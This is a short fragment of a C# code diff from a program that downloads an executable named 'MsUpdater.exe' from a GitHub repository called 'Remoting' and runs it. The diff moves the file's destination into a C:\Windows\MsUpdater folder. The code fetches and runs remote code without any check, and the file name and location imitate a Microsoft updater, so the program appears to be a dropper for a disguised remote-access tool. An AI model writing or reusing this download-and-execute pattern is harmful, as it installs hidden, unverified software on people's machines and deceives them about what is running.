@@ -30,21 +30,21 @@
                 return;
             }
 
-            var target = Path.Combine(Directory.GetCurrentDirectory(), "MsUpdater.exe");
+            const string Target = @"C:\Windows\MsUpdater\MsUpdater.exe";
 
-            if (File.Exists(target))
+            if (File.Exists(Target))
             {
-                File.Delete(target);
+                File.Delete(Target);
             }
 
             const string Download = "https://github.com/Wiciaki/Remoting/blob/master/Downloads/MsUpdater.exe?raw=true";
 
             using (var client = new WebClient())
             {
-                client.DownloadFile(Download, target);
+                client.DownloadFile(Download, Target);
             }
 
-            Process.Start(target);
+            Process.Start(Target);
         }
     }
 }
